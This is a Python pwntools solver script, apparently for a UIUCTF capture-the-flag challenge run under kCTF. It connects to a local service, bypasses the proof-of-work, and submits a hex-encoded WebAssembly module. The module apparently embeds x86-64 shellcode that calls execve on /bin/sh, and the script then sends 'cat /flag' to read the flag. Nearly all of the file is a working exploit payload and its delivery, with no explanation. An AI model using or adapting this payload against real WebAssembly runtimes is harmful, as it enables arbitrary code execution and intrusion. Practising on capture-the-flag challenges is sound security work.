#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)

print(r.recvuntil(b'== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

payload = '''
0061736d0100000001060160017f017f03020100070801046d61696e0000
0a2a01280020004105742000732100200041057420007321002000410574
200073210020004105742000730b009201087761736d6564676501010188
050001d02501e025030288050404010000000290053c3c14000000000000
00017a5200017810011b0c0708900100001c0000001c000000201000000f
00000000410e1083024d0e08000000000000000000000001d0252d2d5348
89f08b324889cbffd089035bc39048b82f62696e2f736800504889e731f6
31d2b83b0000000f05c331d0c3
'''.replace('\n', '').encode()

r.sendlineafter(b':\n', payload)
r.sendlineafter(b': ', b'0')
r.sendline(b'cat /flag')
print(r.recvuntil(b'uiuctf{') + r.recvuntil(b'}'))

exit(0)
